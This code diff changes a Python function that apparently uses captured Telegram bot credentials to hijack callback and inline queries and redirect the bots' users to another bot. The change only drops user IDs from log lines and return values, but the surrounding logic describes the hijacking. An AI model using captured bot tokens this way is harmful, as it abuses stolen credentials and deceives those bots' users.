@@ -4182,8 +4182,10 @@ async def _honeypot_redirect_one_logic(
             )
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
-        logger.info(f"🔀 [Callback] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
-        return {"status": "callback_handled", "sent": sent_ok, "user_id": user_id}
+        logger.info(
+            f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
+        )
+        return {"status": "callback_handled", "sent": sent_ok}
     
     # Level 4: Inline query hijack
     elif update_type == "inline_query":
@@ -4214,8 +4216,10 @@ async def _honeypot_redirect_one_logic(
             )
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
-        logger.info(f"🔀 [Inline] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
-        return {"status": "inline_handled", "sent": sent_ok, "user_id": user_id}
+        logger.info(
+            f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
+        )
+        return {"status": "inline_handled", "sent": sent_ok}
 
     # Get the captured bot's token
     try:
@@ -4301,18 +4305,17 @@ async def _honeypot_redirect_one_logic(
 
     if sent_ok:
         logger.info(
-            f"🔀 [Redirect] sent to user:{user_id} via cred:{credential_id[:8]}... "
+            f"🔀 [Redirect] sent via cred:{credential_id[:8]}... "
             f"→ @{redirect_bot}"
         )
     else:
         logger.warning(
-            f"🔀 [Redirect] FAILED for user:{user_id} cred:{credential_id[:8]}...: "
+            f"🔀 [Redirect] FAILED cred:{credential_id[:8]}...: "
             f"{resp.get('description', resp.get('error', 'unknown'))}"
         )
 
     return {
         "status": "sent" if sent_ok else "failed",
-        "user_id": user_id,
         "credential_id": credential_id,
         "bot": redirect_bot,
     }
